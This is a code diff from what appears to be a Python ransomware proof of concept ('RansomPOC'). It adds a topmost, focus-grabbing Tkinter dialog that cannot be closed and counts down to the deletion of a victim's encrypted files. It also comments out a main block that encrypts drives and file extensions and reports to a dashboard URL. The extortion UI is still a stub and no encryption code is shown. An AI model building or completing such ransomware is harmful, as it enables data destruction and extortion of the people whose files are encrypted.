@@ -505,10 +505,46 @@ class CountdownDialog(Toplevel):
         # Set count down in the Center of the Screen
         self.geometry(f"+{positionRight}+{positionDown}")
 
+# DeletionCountdownDialog class for deletion countdown interactions
+class DeletionCountdownDialog(Toplevel):
+    """ in this class,
+we have a countdown timer to show the user how much time left before deleting all encrypted files """
+    def __init__(self, parent, stop_deletion_callback):
+        super().__init__(parent)
+        self.iconbitmap(ICON_PATH)
+        self.stop_deletion_callback = stop_deletion_callback
+        self.attributes('-topmost', True)
+        self.title("Deletion Countdown")
+        self.resizable(False, False)
 
-if __name__ == "__main__":
-    # Create an instance of the EncryptionTool class
-    encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
-                                    password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
-    encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
-    encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
+        # Get window and screen dimensions to calculate the Position of the Screen Center
+        windowWidth = 400
+        windowHeight = 200
+        screenWidth = self.winfo_screenwidth()
+        screenHeight = self.winfo_screenheight()
+        positionRight = int(screenWidth/2 - windowWidth/2)
+        positionDown = int(screenHeight/2 - windowHeight/2)
+
+        # Apply the calculated position to the Countdown box
+        self.geometry(f"{windowWidth}x{windowHeight}+{positionRight}+{positionDown}")
+
+        self.protocol("WM_DELETE_WINDOW", self.ont_try_close)
+        self.grab_set()
+        self.focus_set()
+        self.init_ui()
+
+
+    def init_ui(self):
+        pass
+
+    def ont_try_close(self):
+        pass
+
+
+
+# if __name__ == "__main__":
+#     # Create an instance of the EncryptionTool class
+#     encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
+#                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
+#     encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
+#     encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
